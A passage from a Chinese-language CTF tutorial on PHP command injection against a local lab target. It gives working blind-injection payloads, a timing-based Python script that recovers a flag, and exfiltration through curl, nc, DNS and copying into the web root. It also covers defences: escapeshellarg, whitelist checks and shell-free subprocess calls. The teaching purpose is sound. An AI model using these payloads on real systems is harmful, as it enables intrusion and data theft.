curl exit=28
```

基线 2 毫秒，`;sleep 3` 后 3 秒整——命令执行石锤，耗时就是回显。第三条用 `--max-time 2` 给 curl 设超时：服务端还在睡，客户端不等了，退出码 28（超时）。==确认执行存在之后，再上条件化的延时，把"执行了"升级成"问什么答什么"==：

```bash
curl -s --noproxy '*' -o /dev/null -w '%{time_total}\n' 'http://127.0.0.1:8503/blind.php?host=%3B%5B%20%22%5B%24%28cut%20-c1%20flag.txt%29%22%20%3D%20f%20%5D%20%26%26%20sleep%202'
curl -s --noproxy '*' -o /dev/null -w '%{time_total}\n' 'http://127.0.0.1:8503/blind.php?host=%3B%5B%20%22%5B%24%28cut%20-c1%20flag.txt%29%22%20%3D%20z%20%5D%20%26%26%20sleep%202'
```

输出：

```
2.016653
```

```
0.006789
```

payload 展开是 `;[ "$(cut -c1 flag.txt)" = f ] && sleep 2`：`cut -c1` 取 flag 第一个字符，`[ ... = f ]` 判断相等，`&&` 串起"相等才睡 2 秒"。==延时值从一个变成一个布尔函数的返回值，这就是盲打的万能句式==，与 [[W04-SQL注入|W04]] 的布尔盲注同构，只是判断表达式从 SQL 换成了 shell。

> [!warning] php -S 单线程会排队
> 内置服务器默认单进程：前一条 `sleep 10` 的请求没结束时，后到的请求全部排在它后面。现象是延时读数莫名翻倍——比如上一条 sleep 10 刚发出、没等完就发下一条，下一条会读出"剩余的 8 秒 + 自己的 2 秒"。要并发测试或跑长延时，用 `PHP_CLI_SERVER_WORKERS=4 php -S …` 起多进程，或保证逐条发完再发下一条。

### 6.2 逐字符还原：把延时变成脚本

6.1 的句式对每个位置、每个候选字符问一遍，就能把盲靶里的 flag 整个读出来。脚本把这套询问自动化：

```python
# solve_blind.py —— 延时侧信道逐字符还原盲靶 flag
import string

import requests

URL = "http://127.0.0.1:8503/blind.php"
CHARS = string.ascii_lowercase + string.digits + "_{}"
DELAY, LIMIT, MAXLEN = 0.6, 2.0, 13


def hit(pos: int, ch: str) -> bool:
    payload = f';[ "$(cut -c{pos} flag.txt)" = "{ch}" ] && sleep {DELAY}'
    r = requests.get(URL, params={"host": payload}, timeout=LIMIT)
    return r.elapsed.total_seconds() >= DELAY


known = ""
for pos in range(1, MAXLEN + 1):
    for ch in CHARS:
        if hit(pos, ch):
            known += ch
            print(f"pos {pos:2d}: {known}")
            break
    else:
        break
print("restored:", known)
```

```bash
python3 solve_blind.py
```

输出：

```
pos  1: f
pos  2: fl
pos  3: fla
pos  4: flag
pos  5: flag{
pos  6: flag{s
pos  7: flag{sl
pos  8: flag{sl3
pos  9: flag{sl33
pos 10: flag{sl33p
pos 11: flag{sl33p}

```

脚本没读过一行靶子代码，==flag 完全由"问"与"计时"还原==。三个参数的取值逻辑：`DELAY` 要显著高于网络抖动（与 [[W04-SQL注入|W04]] 盲注里选 `sleep` 秒数的权衡相同）；`LIMIT` 略大于 `DELAY` 防止 requests 超时误判；候选集按题面可能的字符范围给，集合越小还原越快。

### 6.3 HTTP 外带与 nc 外带

延时法一次只问一个是非题。要一次拿整段数据，让靶子**主动把数据送出来**——它有命令执行，就有发起网络连接的能力。在本机另起一个收集器（[[06-Python与CTF脚本基础|06 章]]的 `http.server`）：

```bash
mkdir -p loot
cd loot
python3 -m http.server 8504 --bind 127.0.0.1
```

payload 让靶子用 curl 把 flag 拼进 URL 发过来：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8503/blind.php?host=%3Bcurl%20-gs%20--noproxy%20%22*%22%20http://127.0.0.1:8504/%24%28cat%20flag.txt%29'
```

输出：

```
200
```

响应体还是只有 `done`（输出块里的 `200` 是 `-w` 打出的状态码，响应体被 `-o /dev/null` 丢了）——外带通道不占回显。收集器的日志里，flag 已经躺在请求行里：

```
127.0.0.1 - - [23/Oct/2026 19:07:46] "GET /flag{sl33p} HTTP/1.1" 404 -
```

`$(cat flag.txt)` 展开成 flag 内容拼进 URL，收集器不存在这个路径，404 无所谓——==要的是请求行里的那串字符==。payload 里的 `-g` 不是装饰：curl 默认把 URL 里的 `{}` 当通配语法展开，flag 两端的 `flag{`、`}` 会被吃掉，外带出去就成了 `flagsl33p`；`-g` 关掉这层展开，字节原样上路。

> [!info]- 不走 HTTP 的外带：nc
> 靶子连 curl 都没有时，nc 也能当运输工具。本机监听收数据：
>
> ```bash
> nc -l 127.0.0.1 8508 > captured.txt
> ```
>
> payload 换成把文件喂给 nc：
>
> ```bash
> curl -s --noproxy '*' 'http://127.0.0.1:8503/blind.php?host=%3Bnc%20127.0.0.1%208508%20%3C%20flag.txt'
> ```
>
> 盲靶的响应不受影响。监听端断开后查看收到的内容：
>
> ```bash
> cat captured.txt
> ```
>
> 输出：
>
> ```
> flag{sl33p}
> ```
>
> nc 监听端 `-l` 收下连接后，`< flag.txt` 把文件原样灌进连接。比 HTTP 少一层日志可看，适合没有 http.server 可用的环境；缺点是监听端要一直开着，且没有日志时间线。

### 6.4 写文件到 Web 根

外带通道一条都不通时（出网受限、无 DNS），还有一条不需要网络的回传路：==命令执行通常伴随文件系统权限，把数据写到 Web 根里，再用 HTTP 当读者==：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8503/blind.php?host=%3Bcp%20flag.txt%20pwned.txt'
curl -s --noproxy '*' 'http://127.0.0.1:8503/pwned.txt'
```

输出：

```
done
```

```
flag{sl33p}
```

`cp` 复制出 `pwned.txt`，第二条请求把它当静态文件读走。前提是 Web 根可写——php -S 默认以当前用户跑，题目靶场多数满足；生产环境常被权限挡住。这条路的变体是写一个 `.php` 文件进去（内容为一句话木马），得到一个可反复交互的 webshell，管理工具（如蚁剑）接手后的文件管理、数据库操作都基于它。

### 6.5 DNS 外带

原理：让靶子发起一次 **DNS 查询**，把数据编进被查询的域名。`curl http://$(cat flag.txt).xxx.dnslog.example` 这类 payload 会让解析器去查 `flagxxx.dnslog.example`——域名里不能有空格和花括号，先 `base64` 或 `xxd` 编码再分段；出站 DNS 几乎总被放行，所以它在内网渗透里是最后一条兜底通道。读取端用 DNSLog 类平台（或自建权威 DNS 服务器）收查询记录。本章不配演示输出：需要一台可控的权威 DNS 才能收全查询链，本地靶场不具备条件；原理与上面的 HTTP 外带同构，==把"送出到收集器"的通道从 HTTP 换成 DNS 协议==而已。

## 7. 防御视角

### 7.1 escapeshellarg：参数的正解

`web6` 目录里是防御靶组，监听 8506：

```bash
cd web6
php -S 127.0.0.1:8506
```

`safe.php` 与注入靶唯一的差别是拼接时套了一层 `escapeshellarg`：

```php
<?php
// safe.php —— 防御靶：escapeshellarg 包住参数
header('Content-Type: text/plain; charset=utf-8');
$host = $_GET['host'] ?? '127.0.0.1';
$cmd  = "ping -c 1 -W 1 " . escapeshellarg($host);
echo "[exec] " . $cmd . "\n";
system($cmd);
```

看它面对本章前五节的全部武器时的样子：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8506/safe.php?host=127.0.0.1'
curl -s --noproxy '*' 'http://127.0.0.1:8506/safe.php?host=127.0.0.1%3Bid%20-un'
curl -s --noproxy '*' "http://127.0.0.1:8506/safe.php?host=127.0.0.1%27%20id"
```

输出：

```
[exec] ping -c 1 -W 1 '127.0.0.1'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.053 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```

```
[exec] ping -c 1 -W 1 '127.0.0.1;id -un'
```

```
[exec] ping -c 1 -W 1 '127.0.0.1'\'' id'
```

`escapeshellarg` 做的事：把整段输入用单引号包住，输入内部的 `'` 转写成 `'\''`（关引号、转义引号、再开引号）。效果是==无论输入带什么，进 shell 后永远只是一个参数==：`;id -un` 成了主机名的一部分，ping 找不到这台主机（报错走 stderr，所以第二条输出没有下文）；引号突破尝试得到的也是字面参数。`$IFS`、通配符、反引号同理全部失效——单引号内 shell 不做任何展开。

两个转义函数的保证范围，用 CLI 对照看清（GNU/Linux + bash）：

```bash
php shellesc.php
```

输出：

```
输入: 127.0.0.1;id
  escapeshellarg : '127.0.0.1;id'
  escapeshellcmd : 127.0.0.1\;id
  连用           : '127.0.0.1\;id'
输入: 127.0.0.1 $(id)
  escapeshellarg : '127.0.0.1 $(id)'
  escapeshellcmd : 127.0.0.1 \$\(id\)
  连用           : '127.0.0.1 \$\(id\)'
输入: 127.0.0.1' id
  escapeshellarg : '127.0.0.1'\'' id'
  escapeshellcmd : 127.0.0.1\' id
  连用           : '127.0.0.1'\\'' id\'
```

| 函数 | 设计目标 | 保证什么 | 不保证什么 |
| ---- | ---- | ---- | ---- |
| `escapeshellarg` | 处理**单个参数** | 整段输入成为一个字面参数，元字符全部失效 | 参数内容可读性（引号被改写） |
| `escapeshellcmd` | 处理**整条可信命令**中的特殊字符 | `;` `\|` `&` `$` 反引号等被加反斜杠，不再有 shell 语义 | 引号配对被它自己改动后的组合行为；不适合处理不可信参数 |

> [!info]- 连用的经典坑
> 有代码把两层套起来求"双保险"：`escapeshellcmd(escapeshellarg($host))`。反面教材 `dblexp.php` 就是这个写法：
>
> ```php
> $cmd = "ping -c 1 -W 1 " . escapeshellcmd(escapeshellarg($host));
> ```
>
> 打两条 payload 看后果：
>
> ```bash
> curl -s --noproxy '*' 'http://127.0.0.1:8506/dblexp.php?host=127.0.0.1%3Bid%20-un'
> curl -s --noproxy '*' "http://127.0.0.1:8506/dblexp.php?host=127.0.0.1%27%20id"
> ```
>
> 输出：
>
> ```
> [exec] ping -c 1 -W 1 '127.0.0.1\;id -un'
> ```
>
> ```
> [exec] ping -c 1 -W 1 '127.0.0.1'\\'' id\'
> ```
>
> 第二条里，`escapeshellarg` 生成的 `'\''` 又被外层 `escapeshellcmd` 转义了一遍，反斜杠再叠一层，成了 `'\\''`——内层引号体系被破坏，shell 切词后参数变成 `127.0.0.1\ id'`（把 ping 换成 echo 就能直接看到切词结果）。这条 payload 在当前 PHP 上没有执行成功，但==用户数据已被改写，包含引号的合法输入从此不能用==；在更老的 PHP 版本上，这类双重转义产生的引号错配曾直接构成命令执行通道（`escapeshellarg` 的历史上还有一类 locale 相关的多字节字符问题——某些环境下多字节串里的引号会被吞掉）。结论只有一条：参数一律 `escapeshellarg`，不用 `escapeshellcmd`，更不连用。

### 7.2 白名单校验

`safe2.php` 在拼接前用正则把输入限制成 IPv4 字面量的形状：

```php
<?php
// safe2.php —— 防御靶：白名单校验后才拼接
header('Content-Type: text/plain; charset=utf-8');
$host = $_GET['host'] ?? '';
if (!preg_match('/^\d{1,3}(\.\d{1,3}){3}$/', $host)) {
    http_response_code(400);
    echo "blocked: not an IPv4 literal\n";
    exit;
}
$cmd = "ping -c 1 -W 1 " . $host;
echo "[exec] " . $cmd . "\n";
system($cmd);
```

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8506/safe2.php?host=127.0.0.1'
curl -s --noproxy '*' 'http://127.0.0.1:8506/safe2.php?host=127.0.0.1%3Bid'
```

输出：

```
[exec] ping -c 1 -W 1 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```

```
blocked: not an IPv4 literal
```

白名单的思想与 [[W03-信息泄露与前端安全|W03]] 的前端校验绕过正相反：前端校验拦不住改包的人，==服务端白名单才是校验==。`^` 与 `$` 锚定首尾，`\d{1,3}` 限死每段长度，整条输入除了数字和三个点不存在任何其他可能，元字符没有生存空间。这条正则仍有空子——`999.999.999.999` 形状合法但不是合法 IP，ping 它：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8506/safe2.php?host=999.999.999.999'
```

输出：

```
[exec] ping -c 1 -W 1 999.999.999.999
```

报错在 stderr 里照旧不可见。形状校验挡住的是注入，不是语义错误；要求更严就按段拆开校验数值范围（每段 0–255）。两道防线同时上：==白名单管输入形状，escapeshellarg 管拼接安全==，互为冗余。

### 7.3 能不进 shell 就不进

2.3 节的语言对照表里有一行值得单独说：Python 的 `subprocess` 列表参数不经过 shell：

```bash
python3 -c 'import subprocess; subprocess.run(["ping","-c","1","-W","1","127.0.0.1;id -un"])'
```

输出：

```
ping: 127.0.0.1;id -un: Name or service not known
```

列表形式让每个元素原样成为一个 `argv` 成员，`;` 是主机名的一部分，shell 从未介入，元字符彻底失去意义——注意报错文本直接出现在终端，因为 stderr 没有被吞。PHP 没有等价的"数组版 exec"，`system` 一族只收字符串，==所以 PHP 侧的正解就是 escapeshellarg（或白名单后拼接）==；在能选接口的语言里，优先选不进 shell 的那一个，把"拼接安全"这个问题从根上取消。

## 8. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| payload 打到 curl 就散架，靶子收到的不全 | curl 命令没加引号，本地 shell 抢先解释了 `;`、`&`：URL 一律用单引号包住再发 |
| `#` 之后的 payload 全部消失 | `#` 未编码，被 curl 当 fragment 截掉：写成 `%23`（[[#4.3 换行与注释：换行符与井号\|4.3]]） |
| 命令明明执行了，响应里没有输出 | 输出走了 stderr，`system` 一族不透传：payload 里补 `2>&1`（[[#2.1 命令执行：system 一族与反引号\|2.1]]） |
| 延时读数比 payload 里的秒数大得多 | 前一条长延时请求堵住了单线程 php -S，后条在排队：上 `PHP_CLI_SERVER_WORKERS` 或逐条串行发（[[#6.1 延时判定\|6.1]]） |
| 外带出来的 flag 缺了 `{}` | curl 把 URL 里的 `{}` 当通配语法展开：加 `-g` 关闭（[[#6.3 HTTP 外带与 nc 外带\|6.3]]） |
| eval 靶一打就 500、响应体为空 | payload 没拼成合法表达式，或 `+` 被 PHP 解码成空格：按靶子的拼接方式构造，`+` 写 `%2B`（[[#3.2 代码执行靶\|3.2]]） |
| `%0a` 写成 `\n` 不生效 | URL 里需要的是换行**字节**本身（`%0a`）；`\n` 是两个普通字符，shell 不解释它 |
| 通配符 payload 打出一屏乱码 | 模式匹配到多个文件，第一个之外的路径全进了参数：先 `echo 模式` 看展开再打（[[#5.3 命令黑名单\|5.3]]） |
| `;cat f*` 把源码也读了出来 | glob 命中了多个文件：文件名相近时收窄成 `fl*` 一类更精确的前缀 |
| 判定 `f` 时延时是对的，换台机器全乱了 | 延时差被网络抖动淹没：加大 `sleep`、多次取样取最大值，先测基线再比较（[[#6.2 逐字符还原：把延时变成脚本\|6.2]]） |
| escapeshellarg 了还被打进来的老题 | 靶子可能把 arg 套了 escapeshellcmd 连用，或运行在存在多字节 locale 缺陷的老版本上：看源码确认（[[#7.1 escapeshellarg：参数的正解\|7.1]]） |
| Windows 侧靶场 payload 不灵 | cmd 语义不同：`;` 不是分隔符（用 `&`），读文件用 `type`、列目录用 `dir`，没有 `$IFS`，通配符由被调程序自己展开 |
